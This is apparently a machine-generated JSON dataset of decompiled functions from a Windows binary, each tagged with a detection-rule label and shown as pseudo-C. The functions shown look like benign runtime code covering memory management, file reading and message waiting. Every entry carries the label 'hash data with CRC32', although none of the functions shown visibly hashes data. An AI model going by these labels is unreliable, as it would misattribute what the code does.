{
    "004013ac": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nushort fcn.004013ac(void)\n\n{\n    ushort uVar1;\n    uchar auStack72 [40];\n    uint8_t uStack32;\n    ushort uStack28;\n    \n    sub.kernel32.dll_GetStartupInfoA(auStack72);\n    uVar1 = 10;\n    if ((uStack32 & 1) != 0) {\n        uVar1 = uStack28;\n    }\n    return uVar1;\n}\n",
        "token_count": 95
    },
    "0040167c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.0040167c(void)\n\n{\n    uint32_t *puVar1;\n    int32_t **ppiVar2;\n    int32_t *piVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    \n    iVar5 = *0x4a671c;\n    if (*0x4a6720 == 0) {\n        return;\n    }\n    if ((*(*0x4a671c + -4) & 1) == 0) {\n        *(*0x4a671c + -4) = *(*0x4a671c + -4) | 8;\n        piVar3 = iVar5 - *0x4a6720;\n        uVar4 = *0x4a6720;\n    }\n    else {\n        uVar4 = *(*0x4a671c + -4) & 0xfffffff0;\n        if (0xb2f < uVar4) {\n            fcn.004015dc();\n            uVar4 = *(*0x4a671c + -4) & 0xfffffff0;\n        }\n        piVar3 = *0x4a671c - *0x4a6720;\n        uVar4 = uVar4 + *0x4a6720;\n    }\n    piVar3[-1] = uVar4 + 3;\n    *((uVar4 - 8) + piVar3) = uVar4;\n    if (uVar4 < 0xb30) {\n        return;\n    }\n    uVar4 = uVar4 - 0xb30 >> 8;\n    iVar5 = (uVar4 - 0x3ff & -(uVar4 < 0x3ff)) + 0x3ff;\n    uVar4 = iVar5 * 8;\n    ppiVar2 = *(uVar4 + 0x4a67ac);\n    *piVar3 = uVar4 + 0x4a67a8;\n    piVar3[1] = ppiVar2;\n    *ppiVar2 = piVar3;\n    *(uVar4 + 0x4a67ac) = piVar3;\n    if (ppiVar2 != uVar4 + 0x4a67a8) {\n        return;\n    }\n    uVar4 = uVar4 >> 8 & 0xff;\n    puVar1 = uVar4 * 4 + 0x4a6728;\n    *puVar1 = *puVar1 | 1 << (iVar5 & 0x1f);\n    *0x4a6724 = *0x4a6724 | 1 << (uVar4 & 0x1f);\n    return;\n}\n",
        "token_count": 594
    },
    "00401d80": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Type propagation algorithm not settling\n\nint32_t fcn.00401d80(void)\n\n{\n    uint8_t uVar1;\n    uint8_t *puVar2;\n    int32_t iVar3;\n    uint8_t **in_EAX;\n    uint8_t *puVar4;\n    int32_t iVar5;\n    uint8_t **ppuVar6;\n    uint32_t uVar7;\n    uint8_t **ppuVar8;\n    uint8_t *puVar9;\n    bool bVar10;\n    uint *puVar11;\n    uchar auStack32 [8];\n    uint uStack24;\n    uint8_t **ppuStack20;\n    \n    ppuVar8 = in_EAX[-1];\n    if ((ppuVar8 & 7) != 0) {\n        if ((ppuVar8 & 5) != 0) {\n            if ((ppuVar8 & 3) != 0) {\n                return -1;\n            }\n            ppuVar8 = in_EAX + -4;\n            fcn.00401760();\n            if ((in_EAX[-1] & 8) == 0) {\n                puVar11 = NULL;\n                iVar5 = sub.kernel32.dll_VirtualFree(ppuVar8, 0, 0x8000, *ppuVar8, in_EAX[-3]);\n                ppuVar6 = ppuVar8;\n                if (iVar5 == 0) {\n                    iVar5 = -1;\n                }\n                else {\n                    iVar5 = 0;\n                }\n            }\n            else {\n                uVar7 = in_EAX[-1] & 0xfffffff0;\n                iVar5 = 0;\n                while( true ) {\n                    sub.kernel32.dll_VirtualQuery(ppuVar8, &stack0xffffffe0);\n                    puVar11 = NULL;\n                    ppuVar6 = ppuVar8;\n                    iVar3 = sub.kernel32.dll_VirtualFree(ppuVar8, 0, 0x8000);\n                    if (iVar3 == 0) break;\n                    if (uVar7 < 0x1d) goto code_r0x00401887;\n                    uVar7 = uVar7 - 0x1c;\n                    ppuVar8 = ppuVar8 + 7;\n                }\n                iVar5 = -1;\n            }\ncode_r0x00401887:\n            if (iVar5 == 0) {\n                *puVar11 = ppuVar6;\n                ppuVar6[1] = puVar11;\n            }\n            *0x4a87a8 = 0;\n            return iVar5;\n        }\n        goto code_r0x00401e81;\n    }\n    puVar9 = *ppuVar8;\n    ppuVar6 = in_EAX;\n    if (*0x4a604d != '\\0') {\n        while( true ) {\n            LOCK();\n            uVar1 = *puVar9;\n            *puVar9 = *puVar9 ^ (uVar1 == 0) * (*puVar9 ^ 1);\n            ppuVar6 = in_EAX;\n            if (uVar1 == 0) break;\n            if (*0x4a65b5 == '\\0') {\n                in_EAX = NULL;\n                ppuStack20 = 0x401e1b;\n                ppuVar6 = ppuVar8;\n                sub.kernel32.dll_Sleep();\n                LOCK();\n                uVar1 = *puVar9;\n                *puVar9 = *puVar9 ^ (uVar1 == 0) * (*puVar9 ^ 1);\n                ppuVar8 = in_EAX;\n                if (uVar1 == 0) break;\n                ppuStack20 = 0xa;\n                uStack24 = 0x401e35;\n                sub.kernel32.dll_Sleep();\n                ppuVar8 = ppuStack20;\n            }\n        }\n    }\n    in_EAX = ppuVar8;\n    ppuVar8 = in_EAX + 3;\n    *ppuVar8 = *ppuVar8 + -1;\n    puVar4 = in_EAX[2];\n    if (*ppuVar8 != NULL) {\n        in_EAX[2] = ppuVar6;\n        ppuVar6[-1] = puVar4 + 1;\n        if (puVar4 != NULL) {\n            *puVar9 = 0;\n            return 0;\n        }\n        puVar4 = *(puVar9 + 4);\n        in_EAX[5] = puVar9;\n        in_EAX[1] = puVar4;\n        *(puVar4 + 0x14) = in_EAX;\n        *(puVar9 + 4) = in_EAX;\n        *puVar9 = 0;\n        return 0;\n    }\n    if (puVar4 == NULL) {\ncode_r0x00401de7:\n        *(puVar9 + 0xc) = puVar4;\n    }\n    else {\n        puVar4 = in_EAX[5];\n        puVar2 = in_EAX[1];\n        *(puVar4 + 4) = puVar2;\n        *(puVar2 + 0x14) = puVar4;\n        puVar4 = NULL;\n        if (*(puVar9 + 0x10) == in_EAX) goto code_r0x00401de7;\n    }\n    *puVar9 = puVar4;\n    ppuVar8 = in_EAX[-1];\ncode_r0x00401e81:\n    puVar9 = ppuVar8 & 0xfffffff0;\n    if (*0x4a604d != '\\0') {\n        while( true ) {\n            LOCK();\n            bVar10 = *0x4a6718 == 0;\n            *0x4a6718 = *0x4a6718 ^ bVar10 * (*0x4a6718 ^ 1);\n            if (bVar10) break;\n            if (*0x4a65b5 == '\\0') {\n                sub.kernel32.dll_Sleep();\n                LOCK();\n                bVar10 = *0x4a6718 == 0;\n                *0x4a6718 = *0x4a6718 ^ bVar10 * (*0x4a6718 ^ 1);\n                if (bVar10) break;\n                ppuStack20 = 0x401e73;\n                sub.kernel32.dll_Sleep();\n            }\n        }\n    }\n    if ((*(puVar9 + -4 + in_EAX) & 1) == 0) {\n        *(puVar9 + -4 + in_EAX) = *(puVar9 + -4 + in_EAX) | 8;\n    }\n    else {\n        uVar7 = *(puVar9 + -4 + in_EAX) & 0xfffffff0;\n        puVar9 = puVar9 + uVar7;\n        if (0xb2f < uVar7) {\n            fcn.004015dc();\n        }\n    }\n    if ((*(in_EAX + -1) & 8) != 0) {\n        puVar4 = in_EAX[-2];\n        in_EAX = in_EAX - puVar4;\n        puVar9 = puVar9 + puVar4;\n        if (0xb2f < puVar4) {\n            fcn.004015dc();\n        }\n    }\n    if (puVar9 != 0x13ffe0) {\n        in_EAX[-1] = puVar9 + 3;\n        *(puVar9 + -8 + in_EAX) = puVar9;\n        fcn.0040161c();\n        *0x4a6718 = 0;\n        return 0;\n    }\n    if (*0x4a6720 == 0x13ffe0) {\n        ppuStack20 = in_EAX + -4;\n        puVar9 = *ppuStack20;\n        ppuVar8 = in_EAX[-3];\n        *(puVar9 + 4) = ppuVar8;\n        *ppuVar8 = puVar9;\n        *0x4a6718 = 0;\n        uStack24 = 0x401f2d;\n        iVar5 = sub.kernel32.dll_VirtualFree();\n        return -(iVar5 == 0);\n    }\n    fcn.0040167c();\n    in_EAX[0x4fff7] = 0x2;\n    *0x4a6718 = 0;\n    *0x4a671c = in_EAX + 0x4fff8;\n    *0x4a6720 = 0x13ffe0;\n    return 0;\n}\n",
        "token_count": 1907
    },
    "null": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "00402494": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402494(int32_t lpBuffer)\n\n{\n    uint32_t in_EAX;\n    \n    if ((0xffff < in_EAX) && ((in_EAX & 3) == 0)) {\n        if ((in_EAX < *(lpBuffer + -0x1c)) || (*(lpBuffer + -0x1c) + *(lpBuffer + -0x10) < in_EAX + 4)) {\n            *(lpBuffer + -0x10) = 0;\n            sub.kernel32.dll_VirtualQuery();\n        }\n        if ((((3 < *(lpBuffer + -0x10)) && (*(lpBuffer + -0xc) == 0x1000)) && ((*(lpBuffer + -8) & 0xf6) != 0)) &&\n           ((*(lpBuffer + -7) & 1) == 0)) {\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 205
    },
    "004026c4": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004026c4(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    char cVar3;\n    bool bVar4;\n    int32_t *in_EAX;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint32_t var_20h;\n    uint32_t *var_1ch;\n    uint32_t *var_18h;\n    uint32_t *var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    iVar2 = arg_8h + -0x1b800 + (*in_EAX - 0x4a1044U >> 5) * 0x800;\n    fcn.00402324();\n    do {\n        if (var_1ch < var_18h) {\n            return;\n        }\n        if (((*(var_18h + -1) & 1) == 0) && (cVar3 = fcn.0040266c(),  cVar3 == '\\0')) {\n            *(arg_8h + -0x1b801) = 0;\n            iVar6 = 0;\n            iVar5 = fcn.00402590();\n            if (iVar5 == 0) {\n                if (((*var_18h < 0x100) && (var_20h = var_18h[1],  0 < var_20h)) && (var_20h <= *(*in_EAX + 2) - 0xd)) {\n                    var_10h = var_18h + 2;\n                    bVar4 = true;\n                    if (0 < var_20h) {\n                        do {\n                            if (((bVar4) && (0x1f < *var_10h)) && (*var_10h < 0x80)) {\n                                bVar4 = true;\n                            }\n                            else {\n                                bVar4 = false;\n                            }\n                            var_10h = var_10h + 1;\n                            var_20h = var_20h - 1;\n                        } while (var_20h != 0);\n                    }\n                    if ((bVar4) && (*var_10h == 0)) {\n                        iVar6 = 1;\n                    }\n                }\n            }\n            else {\n                iVar6 = 2;\n                do {\n                    if ((iVar5 == *(iVar2 + iVar6 * 8)) || (*(iVar2 + iVar6 * 8) == 0)) break;\n                    iVar6 = iVar6 + 1;\n                } while (iVar6 < 0x100);\n                if (iVar6 < 0x100) {\n                    *(iVar2 + iVar6 * 8) = iVar5;\n                }\n                else {\n                    iVar6 = 0;\n                }\n            }\n            piVar1 = iVar2 + 4 + iVar6 * 8;\n            *piVar1 = *piVar1 + 1;\n        }\n        var_18h = var_18h + *(*in_EAX + 2);\n    } while( true );\n}\n",
        "token_count": 671
    },
    "00402810": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.00402810(void)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uchar *puVar5;\n    int32_t *piVar6;\n    uchar auStackY131117 [2049];\n    int32_t aiStackY129068 [4096];\n    int32_t *piStackY112684;\n    uint16_t *puStackY112680;\n    int32_t iStackY112676;\n    int32_t iStackY112672;\n    int32_t iStackY112668;\n    int32_t iStackY112664;\n    int32_t iStackY112660;\n    char cStackY112654;\n    char cStackY112653;\n    int32_t iStackY112652;\n    char cStackY112645;\n    int32_t aiStackY110600 [26035];\n    uint var_4h;\n    \n    iVar3 = 0x27;\n    do {\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    fcn.00403ae4();\n    fcn.00403ae4();\n    iStackY112652 = 0;\n    cStackY112645 = '\\x01';\n    for (iVar3 = *0x4a670c; iVar4 = *0x4a87b0,  iVar3 != 0x4a6708; iVar3 = *(iVar3 + 4)) {\n        iVar4 = fcn.004022e4();\n        while (iVar4 != 0) {\n            uVar1 = *(iVar4 + -4);\n            if ((uVar1 & 1) == 0) {\n                if ((uVar1 & 4) == 0) {\n                    if (iStackY112652 < 0x1000) {\n                        iStackY112664 = (uVar1 & 0xfffffff0) - 4;\n                        cVar2 = fcn.0040266c();\n                        if (cVar2 == '\\0') {\n                            cStackY112645 = '\\0';\n                            aiStackY129068[iStackY112652] = iStackY112664;\n                            iStackY112652 = iStackY112652 + 1;\n                        }\n                    }\n                }\n                else {\n                    fcn.004026c4(&stack0xfffffffc);\n                }\n            }\n            iVar4 = fcn.004022c0();\n        }\n    }\n    while ((iVar4 != 0x4a87ac && (iStackY112652 < 0x1000))) {\n        cVar2 = fcn.0040266c();\n        if (cVar2 == '\\0') {\n            cStackY112645 = '\\0';\n            aiStackY129068[iStackY112652] = (*(iVar4 + 0xc) & 0xfffffff0) - 0x14;\n            iStackY112652 = iStackY112652 + 1;\n        }\n        iVar4 = *(iVar4 + 4);\n    }\n    if (cStackY112645 == '\\0') {\n        cStackY112653 = '\\0';\n        iStackY112668 = 0;\n        puVar5 = fcn.0040247c();\n        iStackY112660 = 0x37;\n        puStackY112680 = 0x4a1046;\n        piStackY112684 = aiStackY110600;\n        do {\n            iStackY112672 = *puStackY112680 - 4;\n            cStackY112654 = '\\0';\n            iVar3 = 0xff;\n            piVar6 = piStackY112684;\n            do {\n                if (auStackY131117 < puVar5) break;\n                if (*piVar6 != 0) {\n                    if (cStackY112653 == '\\0') {\n                        puVar5 = fcn.0040247c();\n                        cStackY112653 = '\\x01';\n                    }\n                    if (cStackY112654 == '\\0') {\n                        *puVar5 = 0xd;\n                        puVar5[1] = 10;\n                        puVar5 = fcn.00402360();\n                        *puVar5 = 0x20;\n                        puVar5[1] = 0x2d;\n                        puVar5[2] = 0x20;\n                        fcn.00402360();\n                        fcn.0040247c();\n                        cStackY112654 = '\\x01';\n                    }\n                    else {\n                        *puVar5 = 0x2c;\n                        puVar5[1] = 0x20;\n                    }\n                    if (iVar3 == 0) {\n                        puVar5 = fcn.0040247c();\n                    }\n                    else if (iVar3 == 1) {\n                        puVar5 = fcn.0040247c();\n                    }\n                    else {\n                        fcn.00404520();\n                        puVar5 = fcn.0040247c();\n                    }\n                    *puVar5 = 0x20;\n                    puVar5[1] = 0x78;\n                    puVar5[2] = 0x20;\n                    puVar5 = fcn.00402360();\n                }\n                iVar3 = iVar3 + -1;\n                piVar6 = piVar6 + -2;\n            } while (iVar3 != -1);\n            iStackY112668 = iStackY112672;\n            piStackY112684 = piStackY112684 + 0x200;\n            puStackY112680 = puStackY112680 + 0x10;\n            iStackY112660 = iStackY112660 + -1;\n        } while (iStackY112660 != 0);\n        if (0 < iStackY112652) {\n            if (cStackY112653 != '\\0') {\n                *puVar5 = 0xd;\n                puVar5[1] = 10;\n                puVar5[2] = 0xd;\n                puVar5[3] = 10;\n            }\n            puVar5 = fcn.0040247c();\n            iStackY112676 = 0;\n            iVar3 = iStackY112652;\n            do {\n                if (iStackY112676 != 0) {\n                    *puVar5 = 0x2c;\n                    puVar5[1] = 0x20;\n                }\n                puVar5 = fcn.00402360();\n                if (auStackY131117 < puVar5) break;\n                iStackY112676 = iStackY112676 + 1;\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n        }\n        fcn.0040247c();\n        sub.user32.dll_MessageBoxA();\n    }\n    return;\n}\n",
        "token_count": 1488
    },
    "00403aac": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint fcn.00403aac(void)\n\n{\n    char extraout_AH;\n    int32_t in_EAX;\n    \n    if ((*(in_EAX + 4) == -0x284f) && (*(in_EAX + 0xc) < *(in_EAX + 0x10))) {\n        if (((*(in_EAX + 6) & 1) == 0) || (*(*(in_EAX + 0xc) + *(in_EAX + 0x14)) != '\\x1a')) {\n            return 0;\n        }\n    }\n    else {\n        fcn.00403bbc();\n        if (extraout_AH != '\\x1a') {\n            *(in_EAX + 0xc) = *(in_EAX + 0xc) + -1;\n            return 0;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 188
    },
    "00403bbc": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t fcn.00403bbc(void)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint32_t uVar4;\n    \n    if (*(in_EAX + 4) != -0x284f) {\n        cVar2 = fcn.00403b80();\n        if (cVar2 == '\\0') goto code_r0x00403c1e;\n    }\n    uVar4 = *(in_EAX + 0xc);\n    if (*(in_EAX + 0x10) <= uVar4) {\n        iVar3 = (**(in_EAX + 0x1c))();\n        if (iVar3 != 0) {\n            fcn.0040306c();\n            goto code_r0x00403c1e;\n        }\n        uVar4 = *(in_EAX + 0xc);\n        if (*(in_EAX + 0x10) <= uVar4) {\n            if ((*(in_EAX + 6) & 1) != 0) {\n                *(uVar4 + *(in_EAX + 0x14)) = 0x1a;\n                *(in_EAX + 0x10) = *(in_EAX + 0x10) + 1;\n            }\n            goto code_r0x00403c1e;\n        }\n    }\n    uVar1 = *(uVar4 + *(in_EAX + 0x14));\n    if (((*(in_EAX + 6) & 1) == 0) || (uVar1 != 0x1a)) {\n        *(in_EAX + 0xc) = uVar4 + 1;\n        return uVar1;\n    }\ncode_r0x00403c1e:\n    return CONCAT31(CONCAT21(in_EAX >> 0x10, 0x1a), 0x1a);\n}\n",
        "token_count": 423
    },
    "00403c28": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00403c28(int32_t param_1, char *param_2)\n\n{\n    bool bVar1;\n    char cVar2;\n    int32_t in_EAX;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint8_t *puVar6;\n    int32_t unaff_EBX;\n    int32_t iVar7;\n    int32_t iVar5;\n    \n    iVar7 = param_1;\n    if (((*(in_EAX + 4) == -0x284f) || (cVar2 = fcn.00403b80(),  cVar2 != '\\0')) && (unaff_EBX = in_EAX,  0 < param_1))\n    {\n        puVar6 = *(in_EAX + 0xc) + *(in_EAX + 0x14);\n        iVar5 = *(in_EAX + 0x10) - *(in_EAX + 0xc);\n        do {\n            while( true ) {\n                iVar4 = iVar5 + -1;\n                if (iVar5 < 1) {\n                    *(in_EAX + 0xc) = puVar6;\n                    uVar3 = fcn.00403bbc(iVar7);\n                    iVar4 = *(in_EAX + 0x10) - *(in_EAX + 0xc);\n                    puVar6 = *(in_EAX + 0xc) + *(in_EAX + 0x14);\n                    if (uVar3 >> 8 != '\\0') {\n                        return in_EAX;\n                    }\n                }\n                else {\n                    uVar3 = *puVar6;\n                    puVar6 = puVar6 + 1;\n                }\n                cVar2 = uVar3;\n                if (cVar2 == '\\n') goto code_r0x00403c7c;\n                iVar5 = iVar4;\n                if (cVar2 == '\\r') break;\n                if ((cVar2 == '\\x1a') && ((*(in_EAX + 6) & 1) != 0)) goto code_r0x00403c7d;\n                *param_2 = cVar2;\n                iVar4 = param_1 + -1;\n                bVar1 = param_1 < 1;\n                param_1 = iVar4;\n                param_2 = param_2 + 1;\n                if (iVar4 == 0 || bVar1) goto code_r0x00403c7d;\n            }\n        } while (*puVar6 != 10);\ncode_r0x00403c7c:\n        puVar6 = puVar6 + -1;\ncode_r0x00403c7d:\n        *(in_EAX + 0xc) = puVar6 - *(in_EAX + 0x14);\n    }\n    return unaff_EBX;\n}\n",
        "token_count": 619
    },
    "0040409c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nulong __fastcall fcn.0040409c(uint32_t param_1)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint uStack12;\n    \n    if ((*(in_EAX + 6) & 1) == 0) {\n        uStack12 = CONCAT31(param_1 >> 8, 10);\n        uVar1 = fcn.00403fcc();\n    }\n    else {\n        uStack12 = param_1 & 0xffff0000 | 0xa0d;\n        uVar1 = fcn.00403fcc();\n    }\n    fcn.0040381c();\n    return CONCAT44(uStack12, uVar1);\n}\n",
        "token_count": 161
    },
    "0040a7b8": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint16_t * __fastcall fcn.0040a7b8(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    uint16_t uVar2;\n    uint16_t *in_EAX;\n    uint16_t *puVar3;\n    \n    param_2 = param_2 - in_EAX;\n    puVar3 = in_EAX;\n    if ((in_EAX & 1) != 0) {\n        cVar1 = *(param_2 + in_EAX);\n        *in_EAX = cVar1;\n        if (cVar1 == '\\0') {\n            return in_EAX;\n        }\n        puVar3 = in_EAX + 1;\n    }\n    do {\n        if (*(param_2 + puVar3) == '\\0') {\n            *puVar3 = '\\0';\n            return in_EAX;\n        }\n        uVar2 = *(param_2 + puVar3);\n        *puVar3 = uVar2;\n        puVar3 = puVar3 + 1;\n    } while (0xff < uVar2);\n    return in_EAX;\n}\n",
        "token_count": 246
    },
    "0040ee40": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040ee40(uint *arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    uint *puStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    puStack48 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    var_ch = 0;\n    var_18h = 0;\n    var_1ch = 0;\n    uStack52 = 0x40ef89;\n    puStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    if ((arg_ch & 2) == 0) {\n        fcn.00405504();\n        fcn.00405504();\n    }\n    else {\n        puStack48 = &stack0xfffffffc;\n        fcn.004099a4();\n        fcn.004099a4();\n    }\n    fcn.00405504();\n    fcn.0040546c();\n    do {\n        if (var_4h == 0) {\ncode_r0x0040ef66:\n            *in_FS_OFFSET = puStack56;\n            puStack48 = 0x40ef90;\n            uStack52 = 0x40ef7b;\n            fcn.0040546c();\n            uStack52 = 0x40ef88;\n            fcn.00405490();\n            return;\n        }\n        iVar1 = fcn.0040e7c8();\n        if (iVar1 == 0) {\n            fcn.00405738();\n            goto code_r0x0040ef66;\n        }\n        fcn.00405964(&fcn.0040ee40::var_1ch, *arg_8h);\n        fcn.00405800(var_14h, var_1ch);\n        fcn.00405964(&fcn.0040ee40::var_ch);\n        if ((arg_ch & 1) == 0) {\n            fcn.00405738();\n            goto code_r0x0040ef66;\n        }\n        var_18h = var_8h;\n        if (var_8h != 0) {\n            var_18h = *(var_8h + -4);\n        }\n        puStack56 = &fcn.0040ee40::var_4h;\n        fcn.00405964();\n    } while( true );\n}\n",
        "token_count": 594
    },
    "0041d0a4": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041d0a4(int32_t arg_8h)\n\n{\n    if (((*(arg_8h + -9) & 1) == 0) && (*(arg_8h + -0x10) == 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 72
    },
    "0041d378": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041d378(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack92;\n    uint uStack88;\n    uint uStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint8_t var_9h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack60 = &stack0xfffffffc;\n    uStack64 = 0x41d59c;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    puStack72 = 0x41d3ae;\n    (**(*in_EAX + 0x28))();\n    puStack72 = 0x41d3b9;\n    fcn.0041e6ec();\n    puStack72 = 0x41d3c4;\n    fcn.0041e6ec();\n    iVar1 = in_EAX[0xb];\n    iVar2 = in_EAX[7];\n    uStack76 = 0x41d56c;\n    uStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    puStack72 = &stack0xfffffffc;\n    if (param_2 == NULL) {\n        if ((var_9h & 1) == 0) {\n            uStack88 = 0x41d405;\n            puStack72 = &stack0xfffffffc;\n            fcn.0041d124(&stack0xfffffffc);\n        }\n        else {\n            uStack88 = 0x41d3fc;\n            puStack72 = &stack0xfffffffc;\n            fcn.0041d2d4(&stack0xfffffffc);\n        }\n    }\n    if (param_2 != NULL) {\n        uStack88 = 0x41d52a;\n        uStack92 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffa4;\n        fcn.0041cfc4(&stack0xfffffffc);\n        *(param_2 + 7) = *(param_2 + 7) | 1;\n        fcn.0041d03c(&stack0xfffffffc);\n        if ((var_9h & 1) == 0) {\n            fcn.0041d234(&stack0xfffffffc);\n        }\n        if (param_2 == NULL) {\n            *in_FS_OFFSET = uStack92;\n            fcn.00404f60();\n            *in_FS_OFFSET = uStack80;\n            puStack72 = 0x41d5a3;\n            uStack76 = 0x41d58d;\n            fcn.00405490();\n            uStack76 = 0x41d59b;\n            fcn.00406864();\n            return;\n        }\n        if ((*(param_2 + 0x1d) & 2) != 0) {\n            in_EAX[7] = param_2;\n        }\n        *(param_2 + 7) = *(param_2 + 7) | 2;\n        fcn.0041d03c(&stack0xfffffffc);\n        (**(*param_2 + 0x14))();\n        *(param_2 + 7) = *(param_2 + 7) & 0xfffd;\n        fcn.0041d03c(&stack0xfffffffc);\n        if ((var_9h & 2) != 0) {\n            fcn.0040483c();\n        }\n        if (((var_9h & 1) == 0) && ((*(param_2 + 0x1d) & 2) == 0)) {\n            fcn.0041cf88(&stack0xfffffffc);\n            fcn.004194b8();\n        }\n        else {\n            iVar3 = fcn.0041966c();\n            if (iVar3 < 0) {\n                fcn.0041cf88(&stack0xfffffffc);\n                fcn.004194b8();\n            }\n        }\n        *in_FS_OFFSET = uStack92;\n    }\n    *in_FS_OFFSET = uStack80;\n    in_EAX[0xb] = iVar1;\n    in_EAX[7] = iVar2;\n    return;\n}\n",
        "token_count": 1031
    },
    "0041f8c8": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.0041f8c8(void)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    \n    while (*(in_EAX + 0x10) != 0) {\n        piVar1 = fcn.004196f8();\n        if (((*(piVar1 + 0x1d) & 1) == 0) && (*0x41f920 != (*0x41f920 & *(in_EAX + 0x1c)))) {\n            fcn.0041f804();\n        }\n        else {\n            fcn.0041f890();\n        }\n        (**(*piVar1 + -4))();\n    }\n    return;\n}\n",
        "token_count": 153
    },
    "0042285c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042285c(uint32_t arg_8h, uint arg_ch, uint32_t arg_10h, uint arg_14h, uint32_t *arg_18h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint var_20h;\n    int32_t var_4h;\n    \n    var_4h = fcn.0042279c();\n    if (var_4h == 0) {\n        uVar1 = sub.kernel32.dll_WaitForMultipleObjectsEx\n                          (arg_10h, arg_14h, -((arg_8h & 1) != 0), arg_ch, -((arg_8h & 2) != 0));\n    }\n    else {\n        while( true ) {\n            uVar1 = sub.user32.dll_MsgWaitForMultipleObjectsEx(arg_10h, arg_14h, arg_ch, 0xbf, arg_8h);\n            if (uVar1 != arg_10h) break;\n            iVar2 = sub.user32.dll_PeekMessageA();\n            if (iVar2 != 0) {\n                sub.user32.dll_TranslateMessage(&var_20h);\n                sub.user32.dll_DispatchMessageA();\n            }\n        }\n    }\n    if (uVar1 == 0x102) {\n        uVar3 = 0x8001011f;\n    }\n    else if (uVar1 == 0xc0) {\n        uVar3 = 0x80010115;\n    }\n    else {\n        uVar3 = 0;\n        if ((uVar1 < 0x80) || (arg_10h + 0x80 <= uVar1)) {\n            *arg_18h = uVar1;\n        }\n        else {\n            *arg_18h = uVar1 - 0x80;\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 425
    },
    "00427b88": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
